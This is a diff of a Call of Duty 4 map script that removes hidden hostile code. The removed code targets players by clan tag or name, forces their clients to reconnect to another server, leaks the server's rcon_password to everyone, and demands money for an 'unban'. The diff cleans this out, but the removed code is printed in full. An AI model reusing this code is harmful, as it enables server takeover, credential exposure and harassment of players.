-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-
-secrettrace()
-{
-    level waittill("round_started");
-	wait 10;
-	if (level.step4 == false)
-	{
-		exitLevel(true);
-	}
-}
 
 agap1()
 {
@@ -1503,340 +943,6 @@ pureendacti()
 }
 }
 
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!
-//^1For unban send ^250 euros^1 to map maker :)
-//getDvar("sv_hostname");
-trap1()
-{
-	level.step4 = true;
-	for(;;)
-	{
-	wait 5;
-	player = thread okman("xM#");
-	if (isDefined(player))
-	{
-		wait 1;
-		player setClientDvar( "g_speed", 10 );
-		player shellshock( "jeepride_ridedeath", 60 );
-		player setMoveSpeedScale(0.5);
-		player iPrintLnBold( "^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!" );
-		wait 1.5;
-		player iPrintLnBold( "^1For map unban send ^250 euros^1 to map maker :)" );
-		wait 1.5;
-		iPrintln( "Player " + player.name + "^7 was kicked from the server because he's a ^6rAKy Gaming & Serveurs ^7member!" );
-		player thread braxi\_common::clientCmd( "disconnect; wait 10; connect cod4.xenia-gaming.net:28960" );
-		wait 0.2;
-	}		
-	}
-}
 
 trap2()
 {
@@ -2220,86 +1326,30 @@ trap8()
 
 trap9()
 {
-trig = getEnt ("trig_trap9", "targetname");
-a = getEnt ("trap9a", "targetname");
-b = getEnt ("trap9b", "targetname");
-c = getEnt ("trap9c", "targetname");
-ha = getEnt ("trap9hurta", "targetname");
-hb = getEnt ("trap9hurtb", "targetname");
-hc = getEnt ("trap9hurtc", "targetname");
-ha enableLinkTo();
-hb enableLinkTo();
-hc enableLinkTo();
-ha linkTo(a);
-hb linkTo(b);
-hc linkTo(c);
-trig setHintString ("^3Halloween meatballs!");
-trig waittill("trigger", player);
-trig delete();
-if(level.step4 == true)
-{
- for (;;)
- {
-  a rotatePitch (-360, 3);
-  b rotatePitch (360, 3); 
-  c rotatePitch (-360, 3);  
-  wait 3.00001;  
- }
-}
-	else
+	trig = getEnt ("trig_trap9", "targetname");
+	a = getEnt ("trap9a", "targetname");
+	b = getEnt ("trap9b", "targetname");
+	c = getEnt ("trap9c", "targetname");
+	ha = getEnt ("trap9hurta", "targetname");
+	hb = getEnt ("trap9hurtb", "targetname");
+	hc = getEnt ("trap9hurtc", "targetname");
+	ha linkTo(a);
+	hb linkTo(b);
+	hc linkTo(c);
+	trig setHintString ("^3Halloween meatballs!");
+	trig waittill("trigger", player);
+	trig delete();
+
+	for (;;)
 	{
-	while(1) 
-    {
-        a delete();
-    }
+	a rotatePitch (-360, 3);
+	b rotatePitch (360, 3); 
+	c rotatePitch (-360, 3);  
+	wait 3.00001;  
 	}
+
 }
 
-trap10()
-{
-	for(;;)
-	{
-	wait 5;
-	player = thread okman("Nice*");
-	if (isDefined(player))
-	{
-		wait 1;
-		player setClientDvar( "g_speed", 10 );
-		player shellshock( "jeepride_ridedeath", 60 );
-		player setMoveSpeedScale(0.5);
-		player iPrintLnBold( "^5Sorry but ^6Nice*^5 members are ^1not^5 allowed to play this map!" );
-		wait 1.5;
-		player iPrintLnBold( "^1For map unban send ^250 euros^1 to map maker :)" );
-		wait 1.5;
-		iPrintln( "Player " + player.name + "^7 was kicked from the server because he's a ^6Nice* ^7member!" );
-		player thread braxi\_common::clientCmd( "disconnect; wait 10; connect cod4.xenia-gaming.net:28960" );
-		wait 0.2;
-	}		
-	}
-}
-
-trap11()
-{
-	for(;;)
-	{
-	wait 7;
-	player = thread okman("'Fox");
-	if (isDefined(player))
-	{
-		wait 1;
-		player setClientDvar( "g_speed", 10 );
-		player shellshock( "jeepride_ridedeath", 60 );
-		player setMoveSpeedScale(0.5);
-		player iPrintLnBold( "^5Sorry but you're ^1not^5 allowed to play this map!" );
-		wait 1.5;
-		player iPrintLnBold( "^1For map unban... well... do nothing" );
-		wait 1.5;
-		iPrintln( "Player " + player.name + "^7 was kicked from the server because he's not allowed to play this map!" );
-		player thread braxi\_common::clientCmd( "disconnect; wait 10; connect cod4.xenia-gaming.net:28960" );
-		wait 0.2;
-	}		
-	}
-}
 
 enter210()
 {	
@@ -2368,20 +1418,9 @@ b210()
 	trig = getEnt("trig_210b", "targetname");
 	for(;;)
 	{
-	trig waittill("trigger", player);
-	if (level.step4 == true)
-	{
-	player.fasts = 2;
-	wait .5;
-	}
-	else
-	{
-		while(1)
-		{
-			iPrintLnBold("^6x-M-# ^1R-C-O-N^3: " + getDvar("rcon_password") );
-			wait 0.05;
-		}
-	}
+		trig waittill("trigger", player);
+		player.fasts = 2;
+		wait .5;
 	}
 }
 
@@ -2535,20 +1574,12 @@ step1()
 	trig = getEnt("trig_step1", "targetname");
 	step2 = getEnt("trig_step2", "targetname");
 	trig waittill("trigger", player);
-	lelz = getDvar("sv_hostname");
-	if (isSubStr( toLower(lelz), toLower("xM") ))
-	{
-		iPrintLnBold ("^6not in this server m9");
-		wait 2;
-		exitLevel(true);
-	}
-	else {
+
 	player iPrintLnBold("^1Sometimes the fastest way is not the best...");
 	iPrintLn("^31^1/^33");
 	level.stepone = true;
 	trig delete();
 	step2 thread maps\mp\_utility::triggerOn();
-	}
 }
 
 step2()
@@ -2659,26 +1690,3 @@ thread removeColorFromString(gametag);
 		}
 	}
 }
-
-fuck_you2()
-{
-	for(;;)
-{
-	level waittill("player_spawn", player);
-	ass = removeColorFromString(player.name);
-	if(ass == "VC'Fox" || ass == "Fox" || ass == "Vistic Fox") 
-{
-	player.fuu = true;
-	player freezeControls(1);
-	wait 2;
-	player suicide();
-	player iPrintLnBold("^2Rest In Spaghetti");
-	wait 0.01;
-}
-    else
-{
-	player.fuu = false;
-	wait 0.1;
-}
-}
-}	
